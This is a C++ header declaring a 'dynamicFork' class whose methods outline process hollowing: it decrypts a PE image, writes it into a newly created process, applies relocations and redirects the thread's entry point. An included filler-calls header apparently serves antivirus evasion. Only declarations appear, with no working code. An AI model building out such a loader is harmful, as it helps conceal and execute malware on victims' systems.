#pragma once
#include <Windows.h>
#include <exception>
#include <string>
#include <iostream>
#include "apiFillerCalls.h"


typedef struct BASE_RELOC_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOC_BLOCK, * PBASE_RELOC_BLOCK;

typedef struct BASE_RELOC_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOC_ENTRY, * PBASE_RELOC_ENTRY;

#define TotalRelocationEntries(blockSize) (blockSize - sizeof(BASE_RELOC_BLOCK)) / sizeof(BASE_RELOC_ENTRY)

class dynamicFork
{
	private:
		struct {
			char* filePath = new char[512]();
			STARTUPINFOA* startupInfo = new STARTUPINFOA();
			PROCESS_INFORMATION* processInfo = new PROCESS_INFORMATION();
		} Process;

		//CONTEXT OF THE NEW CREATED PROCESS THREAD
		PCONTEXT context = new CONTEXT();

		//HEADERS
		struct {
			PIMAGE_DOS_HEADER dosHeader;
			PIMAGE_NT_HEADERS peHeader;
		} Headers;

		void* dwCurrentImageBase;
		void* imageBase;

		PIMAGE_SECTION_HEADER relocSection = NULL;

		void SetHeaders(char* decryptedData);

		void CreateProcessAndWrite(char* decryptedData);

		void AllocateContext();

		void GetBaseAddrOfNewProcess();

		void WriteDataToProcessBaseAddr(char* decryptedData);

		void FindRelocationSection();

		void ApplyRelocations(DWORD relocDelta, DWORD buffAddr);

		void MemoryProtectionUpdate();

		void SetBaseAddressAndEntryPoint();

		void SetContextAndResumeThread();


	public:
		dynamicFork(char* decryptedData);
		~dynamicFork();

};

